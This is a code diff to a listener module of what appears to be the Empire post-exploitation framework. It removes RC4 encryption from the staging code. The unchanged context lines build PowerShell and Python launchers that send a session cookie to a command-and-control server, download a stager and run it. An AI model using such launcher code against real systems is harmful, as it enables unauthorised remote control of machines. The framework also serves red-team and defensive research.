@@ -4,7 +4,7 @@ import logging
 import os
 import random
 
-from empire.server.common import encryption, helpers, packets, templating
+from empire.server.common import helpers, packets, templating
 from empire.server.common.empire import MainMenu
 from empire.server.core.db.base import SessionLocal
 from empire.server.utils import data_util, listener_util
@@ -186,9 +186,6 @@ class Listener:
             # code to turn the key string into a byte array
             stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"
 
-            # this is the minimized RC4 stager code from rc4.ps1
-            stager += listener_util.powershell_rc4()
-
             # prebuild the request routing packet for the launcher
             routingPacket = packets.build_routing_packet(
                 stagingKey,
@@ -215,7 +212,7 @@ class Listener:
 
                     stager += f'$wc.Headers.Add("{headerKey}","{headerValue}");'
 
-            # add the RC4 packet to a cookie
+            # add the routing packet to a cookie
 
             stager += f'$wc.Headers.Add("Cookie","session={b64RoutingPacket}");'
             stager += "$data=$wc.DownloadData($ser+$t);"
@@ -277,7 +274,7 @@ class Listener:
             b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")
 
             launcherBase += "req=urllib.request.Request(server+t);\n"
-            # add the RC4 packet to a cookie
+            # add the routing packet to a cookie
             launcherBase += "req.add_header('User-Agent',UA);\n"
             launcherBase += (
                 f"req.add_header('Cookie',\"session={b64RoutingPacket}\");\n"
@@ -328,7 +325,7 @@ class Listener:
 
             # install proxy and creds globally, so they can be used with urlopen.
             launcherBase += "urllib.request.install_opener(o);\n"
-            launcherBase += "a=urllib.request.urlopen(req).read();\n"
+            launcherBase += "data=urllib.request.urlopen(req).read();\n"
 
             # download the stager and extract the IV
             launcherBase += listener_util.python_extract_stager(stagingKey)
@@ -459,9 +456,7 @@ class Listener:
             # base64 encode the stager and return it
             if encode:
                 return helpers.enc_powershell(stager)
-            if encrypt:
-                RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(RC4IV + stagingKey, stager)
+
             return stager
 
         if language.lower() == "python":
@@ -492,12 +487,7 @@ class Listener:
             # base64 encode the stager and return it
             if encode:
                 return base64.b64encode(stager)
-            if encrypt:
-                # return an encrypted version of the stager ("normal" staging)
-                RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(RC4IV + stagingKey, stager)
 
-            # otherwise return the standard stager
             return stager
 
         log.error(
